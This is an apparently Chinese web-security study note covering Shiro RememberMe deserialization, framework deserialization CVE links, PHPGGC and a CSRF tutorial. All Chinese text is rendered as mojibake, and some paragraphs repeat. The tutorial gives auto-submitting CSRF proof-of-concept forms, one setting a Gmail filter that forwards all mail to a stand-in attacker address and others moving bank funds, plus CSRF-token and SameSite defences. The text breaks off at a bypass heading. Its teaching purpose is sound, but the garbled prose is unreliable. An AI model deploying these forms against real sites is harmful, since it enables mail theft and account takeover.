  readUnshared()ä¸å…è®¸åç»­çš„readObjectå’ŒreadUnsharedè°ƒç”¨å¼•ç”¨è¿™æ¬¡è°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„å¯¹è±¡ï¼Œè€ŒreadObjectè¯»å–çš„å¯¹è±¡å¯ä»¥ã€‚

### [Shiroååºåˆ—åŒ–](https://www.cnblogs.com/xiaozi/p/13239046.html)

[è¯¦æƒ…ä¸åˆ©ç”¨](https://blog.csdn.net/m0_46363249/article/details/122259407?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167646752616800192251873%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=167646752616800192251873&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-18-122259407-null-null.142^v73^pc_new_rank,201^v4^add_ask,239^v1^insert_chatgpt&utm_term=shiro&spm=1018.2226.3001.4187)

æ¼æ´åŸç†

 Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½æˆ‘çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»é™†æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieï¼Œåœ¨æœåŠ¡ç«¯æ¥æ”¶cookieå€¼åï¼ŒBase64è§£ç â€“>AESè§£å¯†â€“>[ååºåˆ—åŒ–](https://so.csdn.net/so/search?q=ååºåˆ—åŒ–&spm=1001.2101.3001.7020)ã€‚æ”»å‡»è€…åªè¦æ‰¾åˆ°AESåŠ å¯†çš„å¯†é’¥ï¼Œå°±å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„å¯¹è±¡ï¼Œå¯¹å…¶è¿›è¡Œåºåˆ—åŒ–â€“>AESåŠ å¯†â€“>Base64ç¼–ç ï¼Œç„¶åå°†å…¶ä½œä¸ºcookieçš„rememberMeå­—æ®µå‘é€ï¼ŒShiroå°†rememberMeè¿›è¡Œè§£å¯†å¹¶ä¸”ååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆååºåˆ—åŒ–æ¼æ´ã€‚

**åˆ¤æ–­**ï¼š

- æœªç™»é™†çš„æƒ…å†µä¸‹ï¼Œè¯·æ±‚åŒ…çš„cookieä¸­æ²¡æœ‰rememberMeå­—æ®µï¼Œè¿”å›åŒ…set-Cookieé‡Œä¹Ÿæ²¡æœ‰deleteMeå­—æ®µ
- ç™»é™†å¤±è´¥çš„è¯ï¼Œä¸ç®¡å‹¾é€‰RememberMeå­—æ®µæ²¡æœ‰ï¼Œè¿”å›åŒ…éƒ½ä¼šæœ‰rememberMe=deleteMeå­—æ®µ
- ä¸å‹¾é€‰RememberMeå­—æ®µï¼Œç™»é™†æˆåŠŸçš„è¯ï¼Œè¿”å›åŒ…set-Cookieä¼šæœ‰rememberMe=deleteMeå­—æ®µã€‚ä½†æ˜¯ä¹‹åçš„æ‰€æœ‰è¯·æ±‚ä¸­Cookieéƒ½ä¸ä¼šæœ‰rememberMeå­—æ®µ
- å‹¾é€‰RememberMeå­—æ®µï¼Œç™»é™†æˆåŠŸçš„è¯ï¼Œè¿”å›åŒ…set-Cookieä¼šæœ‰rememberMe=deleteMeå­—æ®µï¼Œè¿˜ä¼šæœ‰rememberMeå­—æ®µï¼Œä¹‹åçš„æ‰€æœ‰è¯·æ±‚ä¸­Cookieéƒ½ä¼šæœ‰rememberMeå­—æ®µ





### JDBCååºåˆ—åŒ–

[MySQLå®¢æˆ·ç«¯jdbcååºåˆ—åŒ–æ¼æ´](https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload)



### æ¡†æ¶ååºåˆ—åŒ–ï¼ˆCVEï¼‰

- ##### Yii2

  [CVE-2020-15148 Yii2ååºåˆ—åŒ–RCE POPé“¾åˆ†æ](https://xz.aliyun.com/t/8307)

  [æˆ‘æ˜¯å¦‚ä½•æŒ–æ˜yii2ååºåˆ—åŒ–0dayçš„](https://www.anquanke.com/post/id/217930)

- ##### Laravel

  - v5.8

    [Laravel 5.8 RCE åˆ†æ](https://www.bbsmax.com/A/ZOJPvDnldv/)

- ##### ThinkPHP

  - v5.1.x

    [ThinkPHP 5.1.xååºåˆ—åŒ–](https://nikoeurus.github.io/2019/12/31/ThinkPHP 5.1.xååºåˆ—åŒ–/)

### PHPGGC

PHPGGCæ˜¯ä¸€æ¬¾èƒ½å¤Ÿè‡ªåŠ¨ç”Ÿæˆä¸»æµæ¡†æ¶çš„åºåˆ—åŒ–æµ‹è¯•payloadçš„å·¥å…·ã€‚

[PHPGGC: PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)

[ä»0åˆ°1æŒæ¡ååºåˆ—åŒ–å·¥å…·ä¹‹PHPGGC](https://xz.aliyun.com/t/5450)



ä»0åˆ°1å®Œå…¨æŒæ¡CSRF

> äºŒåˆ·æ¼æ´ï¼šçŸ¥å…¶æ‰€ä»¥ç„¶ -> çŸ¥å…¶ç„¶ -> æ‡‚å…¶æ”» -> çŸ¥å…¶å®ˆ

## CSRF

æ€»è§‰å¾—è‡ªå·±çš„ CSRF æŒæ¡çš„æŒºä¸å¥½çš„ï¼Œå¦‚ä»ŠäºŒåˆ·ä¸€éã€‚

å½“åˆä¸€åˆ·çš„æ—¶å€™ç”¨çš„æ˜¯ Portï¼Œè€Œæ¯•ç«Ÿ Port å˜›ï¼Œæ›´åŠ æ³¨é‡çš„æ˜¯æ¼æ´æŒ–æ˜ï¼Œæ‰€ä»¥å½“æ—¶åªæ˜¯ç®€å•åœ°ä¼šç”¨ Burpsuite å½“ä¸­çš„ CSRF Poc è€Œå·²ï¼Œå…¶ä½™çš„åŸç†é˜¿ï¼Œé˜²å¾¡æªæ–½é˜¿ï¼Œéƒ½ä¸å¤ªæ‡‚ã€‚

### 0x02 ä»€ä¹ˆæ˜¯ CSRF

é¢è¯•çš„æ—¶å€™çš„è‘—åé—®é¢˜ï¼š"è°ˆä¸€è°ˆä½ å¯¹ CSRF ä¸ SSRF åŒºåˆ«çš„çœ‹æ³•"

è¿™ä¸ªé—®é¢˜ï¼Œå¦‚æœæˆ‘ä»¬ç”¨éå¸¸é€šä¿—çš„è¯­è¨€è®²çš„è¯ï¼ŒCSRF æ›´åƒæ˜¯é’“é±¼çš„ä¸¾åŠ¨ï¼Œæ˜¯ç”¨æˆ·æ”»å‡»ç”¨æˆ·çš„ï¼›è€Œå¯¹äº SSRF æ¥è¯´ï¼Œæ˜¯ç”±æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œç”¨æˆ·**æ—¥**æœåŠ¡å™¨çš„ã€‚

CSRFï¼ˆCross-site request forgeryï¼‰è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼šæ”»å‡»è€…è¯±å¯¼å—å®³è€…è¿›å…¥ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œåœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™ä¸­ï¼Œå‘è¢«æ”»å‡»ç½‘ç«™å‘é€è·¨ç«™è¯·æ±‚ã€‚åˆ©ç”¨å—å®³è€…åœ¨è¢«æ”»å‡»ç½‘ç«™å·²ç»è·å–çš„æ³¨å†Œå‡­è¯ï¼Œç»•è¿‡åå°çš„ç”¨æˆ·éªŒè¯ï¼Œè¾¾åˆ°å†’å……ç”¨æˆ·å¯¹è¢«æ”»å‡»çš„ç½‘ç«™æ‰§è¡ŒæŸé¡¹æ“ä½œçš„ç›®çš„ã€‚

åœ¨ Port ä¸­ï¼ŒåŸç†å›¾æ˜¯è¿™æ ·çš„

![image](https://image.3001.net/images/20220515/1652623649_6281092110273b376c131.png!small)

> æˆ‘ä»¬åœ¨å­¦ä¹  CSRF æ”»å‡»ä¹‹å‰å¥½å¥½å…ˆé˜è¿°ä¸€ä¸‹å®ƒçš„åŸç†

ä¸€ä¸ªå…¸å‹çš„CSRFæ”»å‡»æœ‰ç€å¦‚ä¸‹çš„æµç¨‹ï¼š

- å—å®³è€…ç™»å½• a.comï¼Œå¹¶ä¿ç•™äº†ç™»å½•å‡­è¯ï¼ˆCookieï¼‰ã€‚
- æ”»å‡»è€…å¼•è¯±å—å®³è€…è®¿é—®äº† b.comã€‚
- b.com å‘ a.com å‘é€äº†ä¸€ä¸ªè¯·æ±‚ï¼ša.com/act=xxã€‚æµè§ˆå™¨ä¼šé»˜è®¤æºå¸¦ a.com çš„ Cookieã€‚
- a.com æ¥æ”¶åˆ°è¯·æ±‚åï¼Œå¯¹è¯·æ±‚è¿›è¡ŒéªŒè¯ï¼Œå¹¶ç¡®è®¤æ˜¯å—å®³è€…çš„å‡­è¯ï¼Œè¯¯ä»¥ä¸ºæ˜¯å—å®³è€…è‡ªå·±å‘é€çš„è¯·æ±‚ã€‚
- a.com ä»¥å—å®³è€…çš„åä¹‰æ‰§è¡Œäº† act=xxã€‚
- æ”»å‡»å®Œæˆï¼Œæ”»å‡»è€…åœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œå†’å……å—å®³è€…ï¼Œè®© a.com æ‰§è¡Œäº†è‡ªå·±å®šä¹‰çš„æ“ä½œã€‚

æ˜¯ä¸æ˜¯æ„Ÿè§‰è¿™ä¸ªå·¥ä½œæµç¨‹å’Œ XSS æœ‰äº›ç±»ä¼¼ï¼Œä½†æ˜¯ XSS ä¸ CSRF çš„æœ€å¤§åŒºåˆ«åœ¨äºå¯¹ Cookie çš„ä½¿ç”¨ï¼ŒXSS çš„æŠŠå—å®³è€… çš„ Cookie å·ç›—è¿‡æ¥ï¼Œè€Œ CSRF åˆ™æ˜¯å€Ÿç”¨äº†å—å®³è€…çš„ Cookieã€‚

ä¸‹é¢æˆ‘ä»¬ä¸¾ä¸ªä¾‹å­æ·±åŒ–ä¸€ä¸‹ CSRF çš„åŸç†ã€‚

### 0x03 CSRF å®æˆ˜åœºæ™¯(åŸç†åº”ç”¨)

æœ¬æ®µå†…å®¹æ‘˜è‡ª[ç¾å›¢æŠ€æœ¯å›¢é˜Ÿæ–‡ç« ](https://tech.meituan.com/2018/10/11/fe-security-csrf.html)

è¿™ä¸€å¤©ï¼Œå°æ˜åŒå­¦ç™¾æ— èŠèµ–åœ°åˆ·ç€ Gmail é‚®ä»¶ã€‚å¤§éƒ¨åˆ†éƒ½æ˜¯æ²¡è¥å…»çš„é€šçŸ¥ã€éªŒè¯ç ã€èŠå¤©è®°å½•ä¹‹ç±»ã€‚ä½†æœ‰ä¸€å°é‚®ä»¶å¼•èµ·äº†å°æ˜çš„æ³¨æ„ï¼š

> ç”©å–æ¯”ç‰¹å¸ï¼Œä¸€ä¸ªåªè¦998ï¼ï¼

èªæ˜çš„å°æ˜å½“ç„¶çŸ¥é“è¿™ç§è‚¯å®šæ˜¯éª—å­ï¼Œä½†è¿˜æ˜¯æŠ±ç€å¥½å¥‡çš„æ€åº¦ç‚¹äº†è¿›å»ï¼ˆè¯·å‹¿æ¨¡ä»¿ï¼‰ã€‚æœç„¶ï¼Œè¿™åªæ˜¯ä¸€ä¸ªä»€ä¹ˆéƒ½æ²¡æœ‰çš„ç©ºç™½é¡µé¢ï¼Œå°æ˜å¤±æœ›çš„å…³é—­äº†é¡µé¢ã€‚ä¸€åˆ‡ä¼¼ä¹ä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿâ€¦â€¦

åœ¨è¿™å¹³é™çš„å¤–è¡¨ä¹‹ä¸‹ï¼Œé»‘å®¢çš„æ”»å‡»å·²ç„¶å¾—æ‰‹ã€‚å°æ˜çš„ Gmail ä¸­ï¼Œè¢«å·å·è®¾ç½®äº†ä¸€ä¸ªè¿‡æ»¤è§„åˆ™ï¼Œè¿™ä¸ªè§„åˆ™ä½¿å¾—æ‰€æœ‰çš„é‚®ä»¶éƒ½ä¼šè¢«**è‡ªåŠ¨è½¬å‘**åˆ° hacker@hackermail.com(ä¹Ÿå°±æ˜¯æ”»å‡»æ–¹çš„é‚®ç®±)ã€‚å°æ˜è¿˜åœ¨ç»§ç»­åˆ·ç€é‚®ä»¶ï¼Œæ®Šä¸çŸ¥ä»–çš„é‚®ä»¶æ­£åœ¨ä¸€å°å°åœ°ï¼Œå¦‚è„±ç¼°çš„é‡é©¬ä¸€èˆ¬åœ°ï¼ŒæŒç»­ä¸æ–­åœ°å‘ç€é»‘å®¢çš„é‚®ç®±è½¬å‘è€Œå»ã€‚

ä¸ä¹…ä¹‹åçš„ä¸€å¤©ï¼Œå°æ˜å‘ç°è‡ªå·±çš„åŸŸåå·²ç»è¢«è½¬è®©äº†ã€‚æ‡µæ‡‚çš„å°æ˜ä»¥ä¸ºæ˜¯åŸŸååˆ°æœŸè‡ªå·±å¿˜äº†ç»­è´¹ï¼Œç›´åˆ°æœ‰ä¸€å¤©ï¼Œå¯¹æ–¹å¼€å‡ºäº† $650 çš„èµå›ä»·ç ï¼Œå°æ˜æ‰å¼€å§‹è§‰å¾—ä¸å¤ªå¯¹åŠ²ã€‚

å°æ˜ä»”ç»†æŸ¥äº†ä¸‹åŸŸåçš„è½¬è®©ï¼Œå¯¹æ–¹æ˜¯æ‹¥æœ‰è‡ªå·±çš„éªŒè¯ç çš„ï¼Œè€ŒåŸŸåçš„éªŒè¯ç åªå­˜åœ¨äºè‡ªå·±çš„é‚®ç®±é‡Œé¢ã€‚å°æ˜å›æƒ³èµ·é‚£å¤©å¥‡æ€ªçš„é“¾æ¥ï¼Œæ‰“å¼€åé‡æ–°æŸ¥çœ‹äº†â€œç©ºç™½é¡µâ€çš„æºç ï¼š

```
<form method="POST" 		action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data"> 
	<input type="hidden" name="cf2_emc" value="true"/> 
	<input type="hidden" name="cf2_email" value="hacker@hakermail.com"/> 
	..... 
	<input type="hidden" name="irf" value="on"/> 
	<input type="hidden" name="nvp_bu_cftb" value="Create Filter"/> 
</form> 

<script> document.forms[0].submit(); </script>
```

##### ä»£ç è§£æ â€”â€”â€”â€” è¿™ä¹Ÿæ˜¯æˆ‘ä»¬åç»­è¦è®²åˆ°çš„ CSRF Poc

è¿™ä¸ªé¡µé¢åªè¦æ‰“å¼€ï¼Œå°±ä¼šå‘Gmailå‘é€ä¸€ä¸ªpostè¯·æ±‚ã€‚è¯·æ±‚ä¸­ï¼Œæ‰§è¡Œäº†â€œCreate Filterâ€å‘½ä»¤ï¼Œå°†æ‰€æœ‰çš„é‚®ä»¶ï¼Œè½¬å‘åˆ°â€œhacker@hackermail.comâ€ã€‚

å°æ˜ç”±äºåˆšåˆšå°±ç™»é™†äº†Gmailï¼Œæ‰€ä»¥è¿™ä¸ªè¯·æ±‚å‘é€æ—¶ï¼Œæºå¸¦ç€å°æ˜çš„ç™»å½•å‡­è¯ï¼ˆCookieï¼‰ï¼ŒGmailçš„åå°æ¥æ”¶åˆ°è¯·æ±‚ï¼ŒéªŒè¯äº†ç¡®å®æœ‰å°æ˜çš„ç™»å½•å‡­è¯ï¼Œäºæ˜¯æˆåŠŸç»™å°æ˜é…ç½®äº†è¿‡æ»¤å™¨ã€‚

é»‘å®¢å¯ä»¥æŸ¥çœ‹å°æ˜çš„æ‰€æœ‰é‚®ä»¶ï¼ŒåŒ…æ‹¬é‚®ä»¶é‡Œçš„åŸŸåéªŒè¯ç ç­‰éšç§ä¿¡æ¯ã€‚æ‹¿åˆ°éªŒè¯ç ä¹‹åï¼Œé»‘å®¢å°±å¯ä»¥è¦æ±‚åŸŸåæœåŠ¡å•†æŠŠåŸŸåé‡ç½®ç»™è‡ªå·±ã€‚

è¿™ä¸ªé¡µé¢åªè¦æ‰“å¼€ï¼Œå°±ä¼šå‘Gmailå‘é€ä¸€ä¸ªpostè¯·æ±‚ã€‚è¯·æ±‚ä¸­ï¼Œæ‰§è¡Œäº†â€œCreate Filterâ€å‘½ä»¤ï¼Œå°†æ‰€æœ‰çš„é‚®ä»¶ï¼Œè½¬å‘åˆ°â€œhacker@hackermail.comâ€ã€‚

å°æ˜ç”±äºåˆšåˆšå°±ç™»é™†äº†Gmailï¼Œæ‰€ä»¥è¿™ä¸ªè¯·æ±‚å‘é€æ—¶ï¼Œæºå¸¦ç€å°æ˜çš„ç™»å½•å‡­è¯ï¼ˆCookieï¼‰ï¼ŒGmailçš„åå°æ¥æ”¶åˆ°è¯·æ±‚ï¼ŒéªŒè¯äº†ç¡®å®æœ‰å°æ˜çš„ç™»å½•å‡­è¯ï¼Œäºæ˜¯æˆåŠŸç»™å°æ˜é…ç½®äº†è¿‡æ»¤å™¨ã€‚

é»‘å®¢å¯ä»¥æŸ¥çœ‹å°æ˜çš„æ‰€æœ‰é‚®ä»¶ï¼ŒåŒ…æ‹¬é‚®ä»¶é‡Œçš„åŸŸåéªŒè¯ç ç­‰éšç§ä¿¡æ¯ã€‚æ‹¿åˆ°éªŒè¯ç ä¹‹åï¼Œé»‘å®¢å°±å¯ä»¥è¦æ±‚åŸŸåæœåŠ¡å•†æŠŠåŸŸåé‡ç½®ç»™è‡ªå·±ã€‚

### 0x04 CSRF çš„æ”»å‡»æ–¹å¼

ä¸Šæ–‡ä¸­ï¼Œæˆ‘ä»¬æ˜æ™°äº†ä¸€ä¸‹ CSRF çš„æ”»å‡»åŸç†ï¼Œä¸‹é¢æˆ‘ä»¬ä¸»è®²æ¼æ´æŒ–æ˜ã€‚

### 1. GET è¯·æ±‚äº§ç”Ÿçš„ CSRF

GET è¯·æ±‚äº§ç”Ÿçš„ CSRF è¾ƒä¸ºç®€å•ï¼Œæœ‰ href æ”»å‡»çš„æ–¹å¼ä¸ HTTP è¯·æ±‚çš„æ–¹å¼ã€‚

#### GET è¯·æ±‚çš„ href ç±» CSRF

```
<a href="http://bank.com/transfer?account_number_from=123456789&account_number_to=987654321&amount=100000">View my Pictures!</a>
```

åœ¨å·²ç»ç™»å½•äº†`bank.com`çš„æƒ…å†µä¸‹ï¼Œå½“æˆ‘ä»¬ç‚¹å‡» "View my Pictures" è¿™ä¸€é“¾æ¥æ—¶ï¼Œå°±ä¼šå°†é’±ä»ä¸€ä¸ªè´¦æˆ·è½¬ç§»åˆ°å¦ä¸€ä¸ªè´¦æˆ·ï¼Œæ•°é¢ä¸º 100000

#### GET è¯·æ±‚çš„ HTTP å‘åŒ… CSRF

ä¸€èˆ¬ä¼šè¿™æ ·åˆ©ç”¨ï¼š

```
![](url/withdraw?amount=10000&for=hacker)
 
```

åœ¨å—å®³è€…è®¿é—®å«æœ‰è¿™ä¸ªimgçš„é¡µé¢åï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å‘
`http://bank.example/withdraw/account=xiaoming&amount=10000&for=hacker`å‘å‡ºä¸€æ¬¡ HTTP è¯·æ±‚ã€‚åœ¨æ”»å‡»è€…æ¥æ”¶åˆ°è¯·æ±‚çš„æ—¶å€™æˆ‘ä»¬ä¾¿å¯ä»¥â€œå€Ÿç”¨â€å¯¹æ–¹çš„ Cookieã€‚

### 2. POST è¯·æ±‚äº§ç”Ÿçš„ CSRF

> POST è¯·æ±‚æ‰€äº§ç”Ÿçš„ CSRF æ˜¯æˆ‘ä»¬åˆ©ç”¨åœ°æœ€å¤šçš„æ”»å‡»æ–¹å¼ã€‚

è¿™ç§ç±»å‹çš„ CSRF åˆ©ç”¨èµ·æ¥é€šå¸¸ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªè‡ªåŠ¨æäº¤çš„è¡¨å•ã€‚

```
<form action="http://bank.example/withdraw" method=POST> 
	<input type="hidden" name="account" value="xiaoming" /> 
	<input type="hidden" name="amount" value="10000" /> 
	<input type="hidden" name="for" value="hacker" /> 
</form> 
<script> document.forms[0].submit(); </script>
```

è®¿é—®è¯¥é¡µé¢åï¼Œè¡¨å•ä¼šè‡ªåŠ¨æäº¤ï¼Œç›¸å½“äºæ¨¡æ‹Ÿç”¨æˆ·å®Œæˆäº†ä¸€æ¬¡ POST æ“ä½œã€‚

POST ç±»å‹çš„æ”»å‡»é€šå¸¸æ¯” GET è¦æ±‚æ›´åŠ ä¸¥æ ¼ä¸€ç‚¹ï¼Œä½†ä»å¹¶ä¸å¤æ‚ã€‚ä»»ä½•ä¸ªäººç½‘ç«™ã€åšå®¢ï¼Œè¢«é»‘å®¢ä¸Šä¼ é¡µé¢çš„ç½‘ç«™éƒ½æœ‰å¯èƒ½æ˜¯å‘èµ·æ”»å‡»çš„æ¥æºï¼Œåç«¯æ¥å£ä¸èƒ½å°†å®‰å…¨å¯„æ‰˜åœ¨ä»…å…è®¸ POST ä¸Šé¢ã€‚

è¿™é‡Œå¯ä»¥é€šè¿‡ Burpsuite è‡ªå¸¦çš„ CSRF Poc å·¥å…·è¿›è¡Œæ”»å‡»ï¼Œä¸è¿‡åœ¨ä½¿ç”¨çš„æ—¶å€™ä¹Ÿæœ‰ä¸€äº›å°æŠ€å·§ã€‚

#### åŸºç¡€çš„ CSRF æ”»å‡»ä½“éªŒ

å¯¹åº”å¯ä»¥å°è¯•çš„é¶åœºï¼Œåœ¨è¿™é¶åœºå½“ä¸­ï¼Œå¹¶æ²¡æœ‰æ·»åŠ ä»»æ„çš„ CSRF é˜²å¾¡

> é¶åœºåœ°å€ [Lab: CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

å› ä¸º CSRF æœ¬è´¨ä¸Šæ˜¯ä¸€ç§é’“é±¼ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿéœ€è¦ç¬¬ä¸‰æ–¹ç½‘ç«™æ”»å‡»ï¼Œå¦‚è‡ªå·±çš„æœåŠ¡å™¨ï¼Œæˆ–è€… Burpsuite é¶åœºè‡ªå¸¦çš„ Exploit serverï¼›WebGoat çš„ WebWolfã€‚

æˆ‘ä»¬å…ˆç™»å½•è¿›é¶åœºå½“ä¸­ï¼Œå‘ç°æœ‰ä¸€åŠŸèƒ½ç‚¹ â€”â€”â€”â€” Update email

![image](https://image.3001.net/images/20220515/1652623677_6281093ddf6c659c807be.png!small)

è¯•æƒ³ä¸€ä¸‹ï¼Œæˆ‘ä»¬è´¦å·è¿›è¡Œäº† Update email çš„æ“ä½œã€‚

è‹¥æˆ‘ä»¬åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šé¢æŒ‚ä¸Šæ¶æ„çš„ Payloadï¼Œè¯±å¯¼ä»–äººç‚¹å‡»ä¹‹åã€‚ç›¸å¯¹åº”çš„ï¼Œå¯¹æ–¹çš„é‚®ç®±ä¹Ÿä¼šå˜æˆæˆ‘ä»¬ CSRF Poc æ‰€æŒ‡å®šçš„ï¼Œè¿™æ ·å­ä¸€æ¥ï¼Œæˆ‘å°±å¯ä»¥é€šè¿‡ "å¿˜è®°å¯†ç " è¿™ç§æœåŠ¡æ¥è·å–ä»–è´¦æˆ·çš„æƒé™äº†ã€‚(å½“ç„¶è¿™é‡Œæœ‰ä¸ªå‰æï¼Œå¯¹æ–¹æ˜¯ç™»å½•è¿‡çš„ä¸” Cookie å¤„äºç”Ÿæ•ˆæœŸé—´)

**Exploit éƒ¨åˆ†**

ç”¨ Burpsuite è‡ªå¸¦çš„ CSRF Poc æ„é€ å‡ºåŸºæœ¬æ¡†æ¶ï¼›

![image](https://image.3001.net/images/20220515/1652623687_62810947088bb8af1e9bd.png!small)

ç„¶åæˆ‘ä»¬æŠŠè¿™ä¸ªæ ¸å¿ƒçš„è¡¨å•æ‹¿å‡ºæ¥ï¼Œå¹¶åŠ ä»¥ä¿®æ”¹ï¼Œæ„é€ æˆæœ€åçš„ POC

```
<form method="$method" action="$url"> 
	
	<input type="hidden" name="$param1name" value="$param1value"> 
</form> 
<script>
	document.forms[0].submit(); 
</script>
```

å†æ”¾å…¥åˆ° Exploit Server å½“ä¸­ï¼Œç‚¹å‡» Deliver it to victim å³å¯ã€‚

åœ¨å¯¹æ–¹æœªå¯¹ CSRF è¿›è¡Œä»»ä½•é˜²å¾¡çš„æ—¶å€™ï¼Œä¸Šè¿°ä¸¤ç§ CSRF æ”»å‡»æ–¹å¼èƒ½å¤Ÿé€šæ€ã€‚

> æ‡‚å…¶æ”» -> çŸ¥å…¶å®ˆ
>
> æˆ‘ä»¬ç°åœ¨å·²ç»çŸ¥é“ CSRF æ”»å‡»æ–¹å¼äº†ï¼Œæ¥ä¸‹æ¥ç€é‡è®²ä¸€è®² CSRF çš„é˜²å¾¡æ‰‹æ®µä»¥åŠç»•è¿‡æ–¹å¼ã€‚

### 0x05 CSRF çš„é˜²å¾¡æ‰‹æ®µ

ä¸»æµçš„ CSRF é˜²å¾¡æ‰‹æ®µæœ‰ä»¥ä¸‹ä¸¤ç§

ban æ‰ä¸æ˜åŸŸå¤–è®¿é—® â€”â€”â€”â€” ä½¿ç”¨åŒæºæ£€æµ‹ä¸ Samesite Cookie

å¤šåŠ ä¸€å±‚éªŒè¯æ‰‹æ®µ CSRF Token

### 1. æ¥è¿‘æ— æ•Œçš„é˜²å¾¡æ‰‹æ³• CSRF Token

å¦‚æœé€šä¿—æ˜“æ‡‚åœ°è§£é‡Šä¸€ä¸‹ CSRF Token çš„å·¥ä½œåŸç†çš„è¯æ˜¯è¿™æ ·çš„ã€‚

CSRF Token æ¯éšç€é¡µé¢è¢«æ“ä½œï¼ŒToken éƒ½ä¼šæ”¹å˜ï¼Œæ¯”å¦‚ f5 åˆ·æ–°ï¼Œç‚¹å‡»æŒ‰é’®ç­‰ç­‰ï¼Œéƒ½ä¼šå¯¼è‡´ CSRF Token å˜åŒ–ã€‚

è€Œæ¯ä¸€ä¸ªè¯·æ±‚çš„ CSRF Token ä¼šé€šè¿‡åç«¯ä»£ç éªŒè¯ Token çš„æœ‰æ•ˆæ€§ â€”â€”â€”â€” æ˜¯å¦æ­£ç¡®ï¼Œåœ¨æ—¶é—´æˆ³ä¸Šæ˜¯å¦æœ‰æ•ˆï¼Œå¦‚æœåŠ å¯†å­—ç¬¦ä¸²ä¸€è‡´ä¸”æ—¶é—´æœªè¿‡æœŸï¼Œé‚£ä¹ˆè¿™ä¸ªTokenå°±æ˜¯æœ‰æ•ˆçš„ã€‚

ä»¥ Java ä¸ºä¾‹ï¼Œæˆ‘ä»¬ä»‹ç»ä¸€ä¸‹ CSRF Token æœåŠ¡ç«¯çš„æ ¡éªŒé€»è¾‘

```
HttpServletRequest req = (HttpServletRequest)request; HttpSession s = req.getSession(); 
// ä» session ä¸­å¾—åˆ° csrftoken å±æ€§ 
String sToken = (String)s.getAttribute(â€œcsrftokenâ€); if(sToken == null) { 
	// äº§ç”Ÿæ–°çš„ token æ”¾å…¥ session ä¸­ 
	sToken = generateToken(); s.setAttribute(â€œcsrftokenâ€,sToken); chain.doFilter(request, response); 
}
else { 
	// ä» HTTP å¤´ä¸­å–å¾— csrftoken 
	String xhrToken = req.getHeader(â€œcsrftokenâ€); 
	// ä»è¯·æ±‚å‚æ•°ä¸­å–å¾— csrftoken 
	String pToken = req.getParameter(â€œcsrftokenâ€); 
	if(sToken != null && xhrToken != null && sToken.equals(xhrToken)){ 
		chain.doFilter(request, response); 
	}
	else if(sToken != null && pToken != null && sToken.equals(pToken)){ 
		chain.doFilter(request, response); 
	}
	else
	{ request.getRequestDispatcher(â€œerror.jspâ€).forward(request,response); 
	} 
}
```

### 2. ç”¨çš„è¾ƒå°‘çš„é™åˆ¶åŒæº

Samesite æ˜¯ Set-Cookie çš„ä¸€ç§å±æ€§ï¼Œå®ƒæœ‰ä¸‰ä¸ªå€¼

`Strict`æœ€ä¸ºä¸¥æ ¼ï¼Œå®Œå…¨ç¦æ­¢ç¬¬ä¸‰æ–¹ Cookieï¼Œè·¨ç«™ç‚¹æ—¶ï¼Œä»»ä½•æƒ…å†µä¸‹éƒ½ä¸ä¼šå‘é€ Cookieã€‚æ¢è¨€ä¹‹ï¼Œåªæœ‰å½“å‰ç½‘é¡µçš„ URL ä¸è¯·æ±‚ç›®æ ‡ä¸€è‡´ï¼Œæ‰ä¼šå¸¦ä¸Š Cookieã€‚

```
Set-Cookie: CookieName=CookieValue; SameSite=Strict;
```

`Lax`è§„åˆ™ç¨ç¨æ”¾å®½ï¼Œå¤§å¤šæ•°æƒ…å†µä¹Ÿæ˜¯ä¸å‘é€ç¬¬ä¸‰æ–¹ Cookieï¼Œä½†æ˜¯å¯¼èˆªåˆ°ç›®æ ‡ç½‘å€çš„ Get è¯·æ±‚é™¤å¤–ã€‚

```
Set-Cookie: CookieName=CookieValue; SameSite=Lax;
```

è¿˜æœ‰ä¸€ç§å±æ€§ä¸º`None`ï¼Œè¿™ç§å±æ€§ä»£è¡¨å…³é—­äº†`SameSite`

> ä¸€èˆ¬æ”»å‡»è¦è¿›è¡Œç»•è¿‡å¯ä»¥å°è¯•å°† SameSite è®¾ç½®ä¸º None

è¿™ç§æ–¹æ³•çš„åŸç†ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå› ä¸º CSRF çš„æœ¬è´¨ä¹Ÿæ˜¯é’“é±¼ï¼Œæ¯”å¦‚æˆ‘é€šè¿‡é‚®ç®±å‘é€é’“é±¼é‚®ä»¶ï¼Œé‚£ä¹ˆè¿™æ—¶å€™çš„ "æº" å°±æ˜¯é‚®ç®±ç•Œé¢ã€‚

å¦‚æœæœåŠ¡å™¨è®¾ç½®äº†ä¸¥æ ¼çš„åŒæºæ”¿ç­–ï¼Œå°†ä¸æ¥æ”¶æ¥è‡ªé‚®ç®±è¿™ä¸€ "æº" çš„è¯·æ±‚ã€‚

**okï¼Œè®²å®Œäº†å¸¸è§„çš„é˜²å¾¡æ‰‹æ®µï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬èŠèŠç»•è¿‡**

------

### 0x06 é’ˆå¯¹ CSRF Token ä¸åŒæºæ”¿ç­–çš„ç»•è¿‡æ‰‹æ®µ

